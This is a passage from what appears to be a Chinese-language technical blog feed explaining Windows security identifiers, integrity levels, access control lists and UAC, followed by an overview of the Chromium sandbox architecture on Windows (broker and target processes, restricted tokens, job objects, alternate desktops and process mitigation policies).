<code>S-1-1-0</code>。</li><li>2 ( <code>SECURITY_LOCAL_SID_AUTHORITY</code>, <em>local group</em> ) 也只有一个 SID: <code>S-1-2-0</code>.</li><li>3 ( <code>SECURITY_CREATOR_SID_AUTHORITY</code>)：SID<code>S-1-3-0</code>到<code>S-1-3-5</code>)</li><li>4 ( <code>SECURITY_NON_UNIQUE_AUTHORITY</code>) 未使用</li><li>5 ( <code>SECURITY_NT_AUTHORITY</code>) 拥有由 NT 安全子系统管理的<a href="https://renenyffenegger.ch/notes/Windows/user-account/index">帐户</a>。</li><li>9 ( <code>SECURITY_RESOURCE_MANAGER_AUTHORITY</code>) …</li><li>16 ( <code>SECURITY_MANDATORY_LABEL_AUTHORITY</code>)，见<a href="https://renenyffenegger.ch/notes/Windows/development/process/index#win-process-integrity-level">流程完整性等级</a></li></ul></li><li><p>Subauthority：这是一个变量号，用于标识SID所描述的用户或组与创建它的机构之间的关系</p><ul><li>号码由那个计算机或网络所创建</li><li>此用户是普通用户、访客、管理员还是其他组的一部分</li><li>该权限创建用户帐户的顺序 (i.e., “This was the first user” or “This is the 231st machine account created”.)</li></ul></li></ul><h2 id="已知-SID"><a href="#已知-SID" class="headerlink" title="已知 SID"></a>已知 SID</h2><p>每个用户的 SID 在所有 Windows 中都是唯一的。也就是说，某些 SID 在所有系统上都是通用的，或者以相同的前缀开头。</p><p>参看<a href="https://docs.microsoft.com/en-US/troubleshoot/windows-server/identity/security-identifiers-in-windows">https://docs.microsoft.com/en-US/troubleshoot/windows-server/identity/security-identifiers-in-windows</a></p><p><strong>Capability SIDs</strong></p><p>Windows 8 引入了<a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers#capability-sids">功能安全标识符 (SID)</a>。Capability SIDs 以唯一且不可变的方式标识能力。Capability SIDs 代表了一种令人难忘的权限令牌，它授予通用 Windows 应用程序对资源（例如文档、相机、位置等）的访问权限。具有该 SID 的应用被授予对关联资源的访问权限，反之没有该 SID的应用程序将被拒绝访问资源。</p><p>操作系统所知的所有功能SID都存储在以下子项中的Windows注册表中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SecurityManager\CapabilityClasses\AllCachedCapabilities</span><br></pre></td></tr></table></figure><p>此子项还包含由第一方或第三方应用程序添加的任何功能 SID。所有功能 SID 都以<code>S-1-15-3</code>.</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://kb.iu.edu/d/aotl">https://kb.iu.edu/d/aotl</a></p><p><a href="https://en.wikipedia.org/wiki/Security_Identifier">https://en.wikipedia.org/wiki/Security_Identifier</a></p><p><a href="https://renenyffenegger.ch/notes/Windows/security/SID/index">https://renenyffenegger.ch/notes/Windows/security/SID/index</a></p><p><a href="https://docs.microsoft.com/en-US/troubleshoot/windows-server/identity/security-identifiers-in-windows">https://docs.microsoft.com/en-US/troubleshoot/windows-server/identity/security-identifiers-in-windows</a></p><h1 id="Integrity-Level"><a href="#Integrity-Level" class="headerlink" title="Integrity Level"></a>Integrity Level</h1><h2 id="Overview-1"><a href="#Overview-1" class="headerlink" title="Overview"></a>Overview</h2><ul><li><p>完整性级别表示正在运行的应用程序进程和对象（例如应用程序创建的文件）的可信度，由一组特殊的 SID 和 ACL 条目实现的，它们代表五个不断增加的特权级别：untrusted, low, medium, high, system</p></li><li><p>如果一个对象处于比请求者更高级的信用等级，访问该对象就会受限。</p></li><li><p>Integrity 级别还实现了用户界面权限隔离，Integrity 性级别的规则应用于在同一桌面下的不同进程之间交换窗口消息</p></li><li><p>token 可以向更高 level 的 object 读数据，但是不能写数据。</p></li><li><p>大多数桌面应用程序以 medium integrity (MI)信任等级运行，信任度较低的程序(保护模式下的 IE 和 GPU 的 Sandbox)以 low integrity (LI) 信任等级运行，而 renderer 则以最低的信任等级运行。</p></li><li><p>Windows 完整性机制的目的是限制同一账户下运行的可信度较低的应用程序的访问权限。主要解决的安全问题是未授权篡改用户数据，间接篡改系统状态，信息泄露。</p></li></ul><blockquote><p>Windows 安全体系结构主要基于 SID 来构建，SID 代表着每个用户或组所被授予的访问权限（读、写和执行权限）和特权。当用户登录 Windows 时，安全子系统会在<code>security access token</code>中添加用户的 SID 和组成员身份 SID，相应的该用户或组下的所有应用程序会被授予同样的访问权限和特权。每次应用程序打开一个<strong>对象</strong>（如文件或注册表项）时，管理该对象的资源管理器都会访问安全子系统来确定此用户是否具有访问权限，安全子系统会把<code>access token</code>中的用户和组的 SID 和与<strong>对象</strong>相关联的 SID 进行比较，如果用户SID在对象的ACL中授予完全访问权限，则用户运行的应用程序进程可以完全访问该对象。</p></blockquote><h2 id="Extending"><a href="#Extending" class="headerlink" title="Extending"></a>Extending</h2><ul><li>Windows 完整性机制通过定义新的访问控制条目（ACE）类型来扩展安全体系结构，新的 ACE (access control entry) 用来代表对象安全描述符中的完整性级别。当访问令牌被初始化时，完整性级别也被分配给安全访问令牌。</li><li>访问令牌中的完整性级别表示 <code>subject</code> 的完整性级别，使用安全描述符中强制标签 ACE 中的完整性级别 SID 来表示对象完整性级别。当安全子系统（安全参考监视器）执行访问检查时，将 <strong>access token</strong> (访问令牌)中的完整性级别 与 <strong>SID</strong> (安全标识符) 中的完整性水平进行比较。</li><li>Windows 根据 Subject 的完整性级别和新访问控制ACE中的完整性策略标志来判断其访问权限。</li><li>安全子系统将完整性级别实现为强制标签，目的是区分 ACLs所提供给用户的自由控制的<code>discretionary access</code></li><li>强制标签 ACE定义了一个 Object 的完整性级别，但是并不改变现有的安全描述符数的据结构定义和常用的自由访问控制表(discretionary access control list，缩写为DACL)，该表通常授予管理员和系统完全控制权限，并授予通过身份验证用户读取和执行权限。</li></ul><blockquote><p>Windows Vista 使用<strong>AccessCheck</strong>函数来确定安全对象具有哪些访问权限</p></blockquote><h3 id="Access-Control-Entries-ACE"><a href="#Access-Control-Entries-ACE" class="headerlink" title="Access Control Entries(ACE)"></a>Access Control Entries(ACE)</h3><p>ACE 是 ACL 列表当中的一个成员。一个 ACL 中可以有 0 个或多个 ACE。每个ACE控制或监视指定受信者的对象的访问权限。一共有 6 种 ACE，其中 3 种支持所有的安全对象，其他三种类型是目录服务对象支持的<a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/object-specific-aces">Object-specific ACEs</a>。</p><p>所有类型的ACE都包含以下访问控制信息：</p><ul><li>安全标识符（SID），用于标识 ACE 应用的 trustee。</li><li>由ACE控制的访问权限的访问掩码。</li><li>表示ACE类型的标志。</li><li>一组位标志，用于确定子容器或对象是否可以从ACL附加到的主对象继承ACE。</li></ul><p>以下是所有安全对象支持的三种 ACE 类型：</p><table><thead><tr><th align="left">Type</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left">Access-denied ACE</td><td align="left">在<a href="https://docs.microsoft.com/en-us/windows/desktop/SecGloss/d-gly"><em>discretionary access control list</em></a> （DACL）中用于拒绝对 trustee 的访问权限。</td></tr><tr><td align="left">Access-allowed ACE</td><td align="left">在DACL中用于允许对 trustee 的访问权限。</td></tr><tr><td align="left">System-audit ACE</td><td align="left">Used in a <a href="https://docs.microsoft.com/en-us/windows/desktop/SecGloss/s-gly"><em>system access control list</em></a> (SACL) to generate an audit record when the trustee attempts to exercise the specified access rights.</td></tr></tbody></table><h3 id="Access-Control-Lists-ACL"><a href="#Access-Control-Lists-ACL" class="headerlink" title="Access Control Lists(ACL)"></a>Access Control Lists(ACL)</h3><p>ACL 是 ACE 的一个列表。ACL 中的每个 ACE 都标识一个 trustee，ACE 代表着 trustee 的允许、拒绝或审核的权限。安全对象的安全描述符可以包含两种类型的 ACL 分别是 DACL 和 SACL：</p><p><a href="https://docs.microsoft.com/en-us/windows/desktop/SecGloss/d-gly">discretionary access control list</a> (DACL) 标识允许或拒绝访问安全对象的受信者(trustee)。当一个进程试图访问一个安全对象时，系统会检查该对象的 DACL 中的 ACE，以确定是否授予对它的访问权。如果该对象没有DACL，系统将授予所有人完全访问权限。如果对象的 DACL 内没有 ACE，系统将拒绝所有进程访问该对象。操作系统按顺序检查 ACE，直到满足以下事件的其中一个：</p><ul><li>access-denied ACE 明确拒绝了线程访问令牌中的某一个 trustee 的所有访问请求</li><li>线程的访问令牌中列出的 trustee 的一个或多个 access-allowed ACEs 显式授予所有请求的访问权限</li><li>已检查所有ACE，但仍至少有一个请求的访问权限未被显式允许，在这种情况下，访问将被隐式拒绝。</li></ul><p>下图显示了对象的DACL如何允许访问一个线程，同时拒绝访问另一个线程：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://docs.microsoft.com/en-us/windows/win32/secauthz/images/accctrl1.png"></p><p>线程 A 请求访问 Object，系统按顺序检查 DACL，发现第一个 ACE 明确拒绝了 Andrew 的访问，而 Andrew 在线程 A 的访问令牌中，所以线程 A 被拒绝。<strong>当请求的访问被明确授予或拒绝时，系统会停止检查 ACE，所以 DACL 中 ACE 的顺序很重要。</strong></p><p><a href="https://docs.microsoft.com/en-us/windows/desktop/SecGloss/s-gly">system access control list</a> (SACL) 使管理员能够记录访问安全对象的尝试。每个 ACE 都明确了由指定的受信者(trustee)进行的尝试访问类型，操作系统会在安全事件日志记录下这一行为(无论访问尝试成功、失败或者二者同时发生都会生成记录)。</p><p>ACL 还为 Microsoft Active Directory 目录服务对象提供访问控制，</p><h2 id="完整性机制的设计"><a href="#完整性机制的设计" class="headerlink" title="完整性机制的设计"></a>完整性机制的设计</h2><p>Windows完整性机制是Windows安全体系结构的扩展，它基于内核中的安全引用监视器(the Security Reference Monitor)。安全引用监视器通过将安全访问令牌中的用户和组 SID 与对象安全描述符的ACL中授予的访问权限进行对比，来判断其是否具有访问权限。完整性机制为安全访问令牌和安全描述符中的System ACL（SACL）添加了完整性级别和强制标签访问控制条目。</p><h3 id="Integrity-levels"><a href="#Integrity-levels" class="headerlink" title="Integrity levels"></a>Integrity levels</h3><p>Windows 使用 SID 定义完整性级别。完整性级别 SID 具有以下形式：S-1-16-xxxx。表 1 显示了完整性级别 SID 的组成部分。</p><p><strong>Table 1  Integrity level SID identifier authority values</strong></p><table><thead><tr><th align="left">Value</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left">16</td><td align="left">表示强制标签授权 (SECURITY_MANDATORY_LABEL_AUTHORITY).</td></tr><tr><td align="left">xxxx</td><td align="left">表示作为完整性级别的相对标识符（RID）字段。RID是表示完整性级别的十六进制值。</td></tr></tbody></table><p>Windows Vista中有四个主要完整性级别，具有四个相应的值，表 2 显示了定义的完整性级别及其相应的值。</p><p><strong>Table 2  Defined integrity levels and corresponding values</strong></p><table><thead><tr><th align="left">Value</th><th align="left">Description</th><th align="left">Symbol</th></tr></thead><tbody><tr><td align="left">0x0000</td><td align="left">Untrusted level</td><td align="left">SECURITY_MANDATORY_UNTRUSTED_RID</td></tr><tr><td align="left">0x1000</td><td align="left">Low integrity level</td><td align="left">SECURITY_MANDATORY_LOW_RID</td></tr><tr><td align="left">0x2000</td><td align="left">Medium integrity level</td><td align="left">SECURITY_MANDATORY_MEDIUM_RID</td></tr><tr><td align="left">0x3000</td><td align="left">High integrity level</td><td align="left">SECURITY_MANDATORY_HIGH_RID</td></tr><tr><td align="left">0x4000</td><td align="left">System integrity level</td><td align="left">SECURITY_MANDATORY_SYSTEM_RID</td></tr></tbody></table><p>例如：S-1-16-8192。 RID值为8192，16 进制为0x2000，代表其具有中完整性级别</p><p>定义完整性级别的 SID 具有与其关联的字符串名称。通过调用 API <code>LookupAccountSID</code> 可以返回每个完整性级别 SID 的字符串名称。表3显示了完整性级别的字符串名称。</p><p><strong>Table 3  Integrity level string names</strong></p><table><thead><tr><th align="left">Integrity level SID</th><th align="left">Name</th></tr></thead><tbody><tr><td align="left">S-1-16-4096</td><td align="left">Mandatory Label\Low Mandatory Level</td></tr><tr><td align="left">S-1-16-8192</td><td align="left">Mandatory Label\Medium Mandatory Level</td></tr><tr><td align="left">S-1-16-12288</td><td align="left">Mandatory Label\High Mandatory Level</td></tr><tr><td align="left">S-1-16-16384</td><td align="left">Mandatory Label\System Mandatory Level</td></tr></tbody></table><h2 id="Integrity-levels-and-UAC"><a href="#Integrity-levels-and-UAC" class="headerlink" title="Integrity levels and UAC"></a>Integrity levels and UAC</h2><ul><li><p>当管理员处于Approval 模式时，Windows Vista 中的 UAC 在同一桌面上以不同的访问级别运行多个程序。每个程序在创建进程的时候内核会分配一个安全访问令牌，基于此令牌每个程序具有不同的权限。</p></li><li><p>标准帐户的用户在登录期间会被分配一个<strong>中等完整性级别</strong>安全访问令牌，相应的这个令牌也会分配给该用户下的几乎所有应用程序。</p></li><li><p>帐户为Administrators组成员的用户在登录时有两个链接在一起的安全访问令牌。一个是标准用户中等完整性级别的访问令牌，其中Administrators组仅用于拒绝访问检查，并且删除了某些管理权限。第二个访问令牌是一个拥有完整特权、高访问权限的令牌，其被分配为高完整性级别，所以该令牌拥有管理员组和管理权限。两个访问令牌都具有相同的用户 SID 和来自 Active Directory 的相同全局组（域和企业管理的筛选组除外）。</p></li><li><p>Windows 资源管理器(Shell)所有非管理员任务都被分配为标准用户和中等完整性的访问令牌，对于作为Administrators组成员的用户，几乎所有应用程序都会使用中间完整性访问令牌运行。</p></li><li><p>完整性机制对于中等完整性级别的应用程序是透明的，除非他们可能会控制更高权限级别上运行的其他进程。例如：Windows UI 自动化是旨在控制其他进程的应用程序的一个示例。</p></li></ul><p>低完整性进程只有通用的执行访问权限。通用的执行访问权限包括以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SYNCHRONIZE, PROCESS_QUERY_LIMITED_INFORMATION</span><br><span class="line">PROCESS_TERMINATE</span><br></pre></td></tr></table></figure><p>一般的，低完整性进程对更高完整性进程的读取访问受到限制（PROCESS_VM_READ access to the virtual memory of a process, and PROCESS_QUERY_INFORMATION），这些内存可能包含用于身份验证的密码数据或其他密钥资料。对较高完整性进程的通用写访问被No_Write_up策略阻止。 通用写入过程访问权限包括：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PROCESS_CREATE_THREAD</span><br><span class="line">PROCESS_VM_OPERATION</span><br><span class="line">PROCESS_VM_WRITE</span><br><span class="line">PROCESS_DUP_HANDLE</span><br><span class="line">PROCESS_SET_QUOTA</span><br><span class="line">PROCESS_SET_INFORMATION</span><br><span class="line">PROCESS_SET_PORT</span><br></pre></td></tr></table></figure><h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a href="https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/bb625957(v=msdn.10)">https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/bb625957(v=msdn.10)</a></p><p><a href="https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/bb625963(v=msdn.10)">https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/bb625963(v=msdn.10)</a></p><p><a href="https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/bb625962(v=msdn.10)">https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/bb625962(v=msdn.10)</a></p><p><a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-control-lists">https://docs.microsoft.com/en-us/windows/win32/secauthz/access-control-lists</a></p><p><a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/how-dacls-control-access-to-an-object">https://docs.microsoft.com/en-us/windows/win32/secauthz/how-dacls-control-access-to-an-object</a></p>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chromium Sandbox on Windows</title>
      <link href="posts/c0b7683f/"/>
      <url>posts/c0b7683f/</url>
      
        <content type="html"><![CDATA[<h1 id="Chromium"><a href="#Chromium" class="headerlink" title="Chromium"></a>Chromium</h1><p>Chromium 主要包含两大核心组成部分：渲染引擎和浏览器内核。</p><p>Chromium 目前使用 Blink 作为渲染引擎，它是基于 webkit 定制而来的，核心逻辑位于项目仓库的<code>third_party/blink/</code>目录下。渲染引擎做的事情主要有：</p><ul><li>解析并构建 DOM 树。Blink 引擎会把 DOM 树转化成 C++ 表示的结构，以供 V8 操作</li><li>调用 V8 引擎处理 JavaScript 和 Web Assembly 代码，并对 HTML 文档做特定操作</li><li>处理 HTML 文档定义的 CSS 样式</li><li>调用 Chrome Compositor，将 HTML 对应的元素绘制出来。这个阶段会调用 OpenGL，未来还会支持 Vulkan。在 Windows 平台上，该阶段还会调用 DirectX 库处理；在处理过程中，OpenGL还会调用到 Skia，DirectX 还会调用到 ANGLE</li></ul><p>Blink组件间的调用先后关系，几乎所有发生在浏览器页签中的工作，都有Blink参与处理。可用下图概括：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/image-20210722105345920.png" alt="image-20210722105345920"></p><p>浏览器内核扮演连接渲染引擎及系统的“中间人”角色，具有一定“特权”，负责处理的事务包括但不限于：</p><ul><li>管理收藏夹、cookies以及保存的密码等重要用户信息</li><li>负责处理网络通讯相关的事务</li><li>在渲染引擎和系统间起中间人的角色。渲染引擎通过Mojo与浏览器内核交互，包含组件：download、payments等等。</li></ul><p>Chromium渲染引擎涉及大量C++编写的组件，出现漏洞的概率不小。因此，基于纵深防御理念浏览器引入了沙箱机制。渲染引擎等组件不直接与系统交互，而是通过一个被称为 MOJO 的 IPC 组件与浏览器引擎通讯（也被称为 broker），再与系统交互。进而可以实现：即便沙箱中的进程被攻破，但无法随意调用系统API产生更大的危害。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210722112150.png" alt="image-20210722112145132"></p><h1 id="Sandbox"><a href="#Sandbox" class="headerlink" title="Sandbox"></a>Sandbox</h1><ul><li><p>沙箱是一个 C++ library，沙箱进程便是通过该<code>C++ library</code>所创建，为了确保安全性，沙箱进程所处的执行环境是非常受限的。</p></li><li><p>沙盒进程可以自由使用的唯一资源是 CPU 周期和内存。例如，沙箱进程不能向磁盘写数据或显示它们自己的窗口。</p></li><li><p>Chromium renderers 便是一个沙盒进程。沙箱的目标是提供关于一段代码最终能做什么或不能做什么的硬保证。</p></li><li><p>沙箱限制了在沙箱内运行代码的 bug 的影响性，例如：这种bug不能在用户帐户中安装持久性恶意软件（因为沙箱禁止写入文件系统）也不能从计算机本地当中读取任何文件。但是沙箱不能够对系统组件提供保护（如运行它的内核）</p></li><li><p>沙箱无法针对系统组件（例如运行它的内核）中的错误提供任何保护。</p></li><li><p>沙箱在运行初始时并不是完全状态，只有当进程调用<code>LowerToken()</code>方法后，沙箱才会完全生效。这样的设置，使得沙箱进程在启动这段时间内，可以自由的获取关键资源，加载 library，读取配置文件。所以，当进程开始和不受信任的文件交互之前，应尽快调用 <code>LowerToken()</code>。</p><p>  Note：如果进程被感染，在调用<code>LowerToken()</code>后，打开的操作系统句柄都可能会被恶意软件滥用。</p><blockquote><p>浏览器渲染引擎、GPU、PPAPI插件以及语音识别服务等进程是运行在沙箱中的。此外不同系统平台下的部分服务也会受沙箱保护，例如Windows下打印时调用的PDF转换服务、icon浏览服务；MacOS下NaCl loader、需要访问IOSurface的镜像服务等。</p></blockquote></li></ul><h1 id="Windows-Sandbox-架构"><a href="#Windows-Sandbox-架构" class="headerlink" title="Windows Sandbox 架构"></a>Windows Sandbox 架构</h1><ul><li>Windows sandbox 是仅限于 <strong>user-mode</strong>的沙箱，也没有特殊的内核模式驱动程序，因此用户不需要成为管理员，以确保 Sandbox 的正常运行。</li><li>Sandbox 有 32 位和 64 位两种，在所有的 Win7 和 Win10 均已经被测试</li><li>Sandbox 在进程级粒度进行运作，任何需要沙箱化的目标，都需要其是独立进程。最简单的沙箱配置需要两个进程：一个是被称为 broker 的 privileged controller，以及被称为 target 的一个或多个沙箱化进程。</li><li>Sandbox 作为静态库提供，必须链接到 broker 和目标可执行文件。</li></ul><h2 id="The-broker-process"><a href="#The-broker-process" class="headerlink" title="The broker process"></a>The broker process</h2><p>在 chromium 中，broker就是浏览器的主进程。宽泛的说，borker 是权限控制器 / sandbox进程活动的管理员。其职责是：</p><ul><li>指定每个目标进程中的策略</li><li>生成目标进程</li><li>维护沙箱策略引擎服务</li><li>维护沙箱拦截管理器</li><li>维护沙箱IPC服务（与target进程的通信）</li></ul><p>broker 的存活时间总是比他生成的目标进程要长，Sandbox IPC是一种用于将某些 Windows API 调用从 target 转发到 broker 的低级机制(不同于Chromium的IPC)，这些 API 根据策略而定。策略允许的 API 则由 borker 进行调用，结果会通过同样的IPC返回给目标进程。 Interceptions manager 的工作给应该通过 IPC 转发给 broker 的Windows API调用提供补丁。</p><h2 id="The-target-process"><a href="#The-target-process" class="headerlink" title="The target process"></a>The target process</h2><p>在 chromium 中，target process 就是 renderers，除非执行了 <code>--no-sandbox</code>命令。target 进程维护所有将在沙箱中运行的代码，以及沙箱 client 方面的基础架构：</p><ul><li>对所有代码进行沙箱化</li><li>沙箱化 IPC client</li><li>沙箱策略引擎客户端</li><li>沙箱拦截</li></ul><blockquote><p>2、3、4 是 sandbox library 的一部分，需要和被沙箱化的代码一同链接</p></blockquote><p>Interceptions(hooks)是 Windows API 调用通过沙箱 IPC 转发到 broker 的方式。The interceptions (also known as hooks) are how Windows API calls are forwarded via the sandbox IPC to the broker.</p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210720190130.png" style="zoom:50%;" /><h2 id="Sandbox-restrictions"><a href="#Sandbox-restrictions" class="headerlink" title="Sandbox restrictions"></a>Sandbox restrictions</h2><p>沙盒依赖于 Windows 提供的四种保护机制：</p><ul><li><p>A restricted token</p></li><li><p>The Windows <em>job</em> object</p></li><li><p>The Windows <em>desktop</em> object</p></li><li><p>Integrity levels</p></li></ul><p>这些机制在保护操作系统，操作系统的限制，用户提供的数据上相当的高效，前提是：</p><ul><li>所有可以安全化的资源都有一个比null更好的安全描述符。换言之，没有关键资源会有错误的安全配置。</li><li>电脑还没有被恶意软件破坏。</li><li>第三方软件不会降低系统的安全性。</li></ul><h3 id="The-token"><a href="#The-token" class="headerlink" title="The token"></a>The token</h3><p>对于 Chromium Sandbox 最严格的 token 采用以下形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Regular Groups</span><br><span class="line">Logon SID : mandatory</span><br><span class="line">All other SIDs : deny only, mandatory</span><br><span class="line">Restricted Groups</span><br><span class="line">S-1-0-0 : mandatory</span><br><span class="line">Privileges</span><br><span class="line">None</span><br><span class="line">Integrity</span><br><span class="line">Untrusted integrity level label (S-1-16-0x0)</span><br></pre></td></tr></table></figure><p>Chromium 的渲染器以某个 token 运行，意味着渲染器进程使用的几乎所有资源都已被浏览器获取，它们的句柄也将被复制到渲染器的进程中。</p><p><strong>NOTE</strong>：token 不是派生于anonymous or guest 的 token，它继承于 user’s token 与用户的登录相关联。因此，系统或域中已有的任何审计仍然可以使用。</p><p>根据设计，沙箱 token 不能保护下面这些不安全资源：</p><ul><li>挂载的FAT或FAT32卷: 它们的安全描述符是 NULL。在 target 中运行的恶意软件可以读写这些磁盘空间。</li><li>TCP/IP: Windows 200和Windows XP（但在Vista中不会）中的TCP/IP socket的安全性实际上是无效的。target 中的恶意代码可能会向任何主机发送和接收网络数据包。</li><li>一些未标记的 objects，例如匿名共享内存 (e.g. <a href="https://crbug.com/338538">bug 338538</a>)</li></ul><h3 id="The-Job-object"><a href="#The-Job-object" class="headerlink" title="The Job object"></a>The Job object</h3><p>target 进程也运行于 object 之下，使用这个 Windows 机制，一些没有传统对象或安全描述符的的全局限制被强制执行:</p><ul><li>禁止用SystemParametersInfo()做用户共享的系统范围的修改，这可以用于切换鼠标按钮或者设置屏幕保护程序超时</li><li>禁止创建或修改桌面对象</li><li>禁止修改用户共享的显示设置，比如分辨率和主显示器</li><li>禁止读写剪贴板</li><li>禁止设置全局Windows hook（使用SetWindowsHookEx()）</li><li>禁止访问全局原子表</li><li>禁止访问在作业对象外创建的USER句柄</li><li>单活跃的进程限制（不允许创建子进程）</li></ul><p>Chromium 渲染器通常在这些限制全部都开启后运行。每个渲染器运行在其自己的 Job object 里。</p><h3 id="The-alternate-desktop"><a href="#The-alternate-desktop" class="headerlink" title="The alternate desktop"></a>The alternate desktop</h3><p>token 和 job object 规定了一个安全边界。</p><ul><li>只要进程的 token 相同且处于同一 job object 下，那么他们同处于同一个安全的上下文环境中。</li><li>在同一桌面下具有有窗口的应用程序也处于同一个安全的上下文环境中。因为发送和接收窗口消息不受任何安全检查的约束。</li></ul><p>在标准Windows安装中，至少有两个桌面和交互式窗口站相关联：常规（默认）桌面和登录桌面。Sandbox创建了与所有目标进程关联的第三个桌面。此桌面不可见也不能交互，并且有效地隔离沙箱化进程，使其不能窥探用户的交互，不能在更多特权的环境下发送消息到Windows。</p><p>唯一的缺点是会使用4MB 的 RAM，Vista下可能会更多。</p><h3 id="The-integrity-levels"><a href="#The-integrity-levels" class="headerlink" title="The integrity levels"></a>The integrity levels</h3><ul><li><p>Integrity 级别是由一组特殊的 SID 和 ACL 条目实现的，它们代表五个不断增加的特权级别：untrusted, low, medium, high, system</p></li><li><p>如果一个对象处于比请求者更高级的信用等级，访问该对象就会受限。</p></li><li><p>Integrity 级别还实现了用户界面权限隔离，Integrity 性级别的规则应用于在同一桌面下的不同进程之间交换窗口消息</p></li><li><p>token 可以向更高 level 的 object 读数据，但是不能写数据。</p></li><li><p>大多数桌面应用程序以 medium integrity (MI)信任等级运行，信任度较低的程序(保护模式下的 IE 和 GPU 的 Sandbox)以 low integrity (LI) 信任等级运行，而 renderer 则以最低的信任等级运行。</p></li></ul><p>一个低 level 的 token 只能访问以下资源：</p><ul><li>从大部分的文件里读取数据</li><li>可以向 <code>%USER PROFILE%\AppData\LocalLow</code> 写数据</li><li>读注册表的大部分内容</li><li>可以向 <code>HKEY_CURRENT_USER\Software\AppDataLow</code>写数据</li><li>剪贴板(为某些格式做复制粘贴)</li><li>远程过程调用（RPC）</li><li>TCP/IP Socket</li><li>通过ChangeWindowMessageFilter暴露窗口消息</li><li>通过LI标签共享内存</li><li>拥有LI启动激活的权限，访问COM接口</li><li>通过LI标签暴露的命名管道</li></ul><h3 id="Process-mitigation-policies"><a href="#Process-mitigation-policies" class="headerlink" title="Process mitigation policies"></a>Process mitigation policies</h3><p>沙箱通过 <code>SetProcessMitigationPolicy</code> 方法来给 target 进程设置保护措施，以强化安全特性。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">Data Execution Prevention：</span><br><span class="line">数据执行保护，是一组在存储器上运行额外检查的硬件和软件技术，有助于防止恶意程序码在系统上运行。和 LINUX 下的 NX 保护比较类似，堆栈只有读写权限，没有执行权限，主要用途是限制以写 shellcode 为主的攻击手段。</span><br><span class="line"></span><br><span class="line">Relocate Images:</span><br><span class="line">&gt;&#x3D; Win8</span><br><span class="line">在进程中对所有图片做随机地址加载(ASLR)（必须被所有图片支持）</span><br><span class="line"></span><br><span class="line">Heap Terminate:</span><br><span class="line">&gt;&#x3D; Win8</span><br><span class="line">结束Windows堆占用进程</span><br><span class="line"></span><br><span class="line">Bottom-up ASLR:</span><br><span class="line">&gt;&#x3D; Win8</span><br><span class="line">地址随机化</span><br><span class="line"></span><br><span class="line">High-entropy ASLR:</span><br><span class="line">&gt;&#x3D; Win8</span><br><span class="line">为自底向上ASLR增加随机等级到1TB</span><br><span 